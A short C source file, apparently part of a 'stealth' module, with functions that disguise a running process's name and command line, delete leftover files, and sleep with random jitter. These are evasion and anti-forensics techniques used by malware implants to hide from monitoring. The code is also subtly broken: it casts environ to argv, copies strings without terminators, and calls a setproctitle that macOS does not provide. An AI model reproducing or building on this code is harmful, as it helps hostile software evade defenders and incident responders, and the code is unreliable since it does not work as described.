#include "stealth.h"

void rename_process(const char *new_name) {
    // Change the process name to the new_name
#ifdef __linux__
    strncpy(program_invocation_short_name, new_name, strlen(new_name));
    strncpy(program_invocation_name, new_name, strlen(new_name));
#endif
#ifdef __APPLE__
    // macOS equivalent
    extern int setproctitle(const char *);
    setproctitle(new_name);
#endif
    printf("Process renamed to: %s\n", new_name);
}

void change_cmdline(const char *new_cmdline) {
    // Change the command-line arguments displayed in `/proc/<pid>/cmdline`
#ifdef __linux__
    char **argv = *(char ***) environ;
    strncpy(argv[0], new_cmdline, strlen(new_cmdline));
    argv[1] = NULL; // Terminate the argument list
#endif
    printf("Command-line arguments updated.\n");
}

void clean_artifacts() {
    // Remove temporary files or artifacts
    const char *temp_files[] = {"/tmp/file1", "/var/tmp/file2", NULL};
    for (int i = 0; temp_files[i] != NULL; i++) {
        if (unlink(temp_files[i]) == 0) {
            printf("Removed artifact: %s\n", temp_files[i]);
        } else {
            perror("Error removing artifact");
        }
    }
}

void dynamic_sleep(int base_time, int jitter) {
    // Sleep for a random interval based on base_time and jitter
    srand(time(NULL));
    int sleep_time = base_time + (rand() % jitter);
    printf("Sleeping for %d seconds...\n", sleep_time);
    sleep(sleep_time);
}